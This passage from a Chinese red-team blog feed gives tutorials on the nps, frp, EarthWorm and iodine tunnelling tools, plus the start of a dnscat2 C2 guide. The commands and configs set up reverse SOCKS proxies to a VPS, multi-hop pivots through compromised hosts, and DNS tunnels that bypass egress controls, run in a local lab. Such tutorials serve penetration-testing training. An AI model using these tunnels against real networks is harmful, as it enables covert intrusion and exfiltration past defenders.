src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609171610.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>新增之后，刷新一下可以看到刚刚添加的记录，点击刚刚新增记录里的“加号”还能直接看到在客户端上要运行的命令，这个可谓是很贴心了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172254.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>复制命令到客户端上运行，服务端这边就能看到目标已经上线了，连接状态也由离线变成了在线。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172144.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果想创建一个 SOCKS5 代理也很简单，直接点击 “SOCKS 代理”–》“新增”，输入客户端的 ID 和代理的端口，然后新增即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609172512.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后直接设置 SOCKS5 代理 IP 为 nps 服务端 IP ，端口这里设置的是 1080，这样就建立了一个 SOCKS 代理，如果新增设置客户端的时候，设置了认证账号密码，那么在连接 SOCKS 代理的时候，也要添加上对应的账号和密码。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609173211.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在这整个过程中都没有修改配置文件等等操作，真的是很方便了。</p><blockquote><p>参考文章：</p><p><a href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】11、frp 的使用</title>
      <link href="//210611-171526.html"/>
      <url>//210611-171526.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p><h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p><blockquote><p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p></blockquote><h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p><p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>配置客户端配置文件</p><pre class="line-numbers language-none"><code class="language-none">[common]# 服务端 IPserver_addr &#x3D; vps_ip# 服务端端口server_port &#x3D; 4444[rdp]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 3389# 连接 vps 的端口remote_port &#x3D; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609155435.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444# 客户端认证 tokentoken &#x3D; 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port &#x3D; 8000dashboard_user &#x3D; admindashboard_pwd &#x3D; password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p></blockquote><p>配置好文件后，启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021&#x2F;06&#x2F;09 04:06:35 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置客户端文件</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; vps_ipserver_port &#x3D; 4444# 客户端认证 token，需要和服务端 token 保持一致token &#x3D; 123456# 启用加密，防止流量被拦截use_encryption &#x3D; true# 启用压缩，提升流量转发速度use_compression &#x3D; true[socks5]type &#x3D; tcp# 连接 vps 的端口remote_port &#x3D; 1080plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启客户端</p><pre class="line-numbers language-none"><code class="language-none">frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021&#x2F;06&#x2F;09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>打开 frps 仪表盘，登录后，可以看到当前连接数据的相关信息</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210609161859.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>frp 的参数远不止文章中提到的这些，更多功能可以参考下面的参考文章。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a></p><p><a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】10、ew 的使用</title>
      <link href="//210610-164507.html"/>
      <url>//210610-164507.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-s 设置状态模式-l 设置监听端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-e 设置反弹主机端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d vps_ip -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-d 设置反弹主机 IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP） --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机B上，开启正向连接代理</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机A上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_tran -l 1080 -f hostB_ip -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机A --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机 A --》内网主机 B --》内网主机 C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 5555 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d 192.168.7.110 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】9、iodine 使用</title>
      <link href="//210608-213403.html"/>
      <url>//210608-213403.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p><p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p><p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows 可以直接到官网下载，下载地址：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p><pre class="line-numbers language-none"><code class="language-none">sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-f在前台运行-c不检查传入请求的客户端 IP 地址-P客户端与服务端之间的连接密码-D调试级别，-D 表示第一级，-DD 表示第二级，依此类推192.168.77.1 是自己自定义的局域网虚拟 IP 地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p><p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p><p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p><pre class="line-numbers language-none"><code class="language-none">.\iodine.exe -f -r -P teamssix dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-riodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p><p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_21-12-06.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】dnscat2 使用</title>
      <link href="//210608-150224.html"/>
      <url>//210608-150224.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>dnscat2 是一款 C2 工具，与常规 C2 工具不同的是它利用了 DNS 协议来创建加密的 C2 通道。</p><p>dnacat2 的客户端由 C 语言编写，服务端由 Ruby 语言编写，在攻击主机上开启服务端后，客户端放到目标主机上执行相关命令，攻击主机就能够收到来自客户端的会话了。</p><p>dnscat2 有两种使用模式，一是直连模式，二是中继模式，区别如下：</p><p>直连模式：客户端直接向指定 IP 地址的 DNS 服务器发起 DNS 解析请求</p><p>中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。</p><p>在安全策略做的比较严格的内网中，如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，RT 就可以尝试使用 DNS 协议建立 C2 通信。</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h2><p>这里以 Ubuntu 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.gitcd dnscat2&#x2F;server&#x2F;sudo gem install bundlerbundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果运行 <code>sudo gem install bundler</code> 提示 <code>Command &#39;gem&#39; not found</code>，则需要先安装 ruby </p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install ruby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果运行 <code>bundle install</code> 提示 <code>Gem::Ext::BuildError: ERROR: Failed to build gem native extension.</code>，则需要先安装 ruby-dev</p><pre class="line-numbers language-none"><code class="language-none">sudo 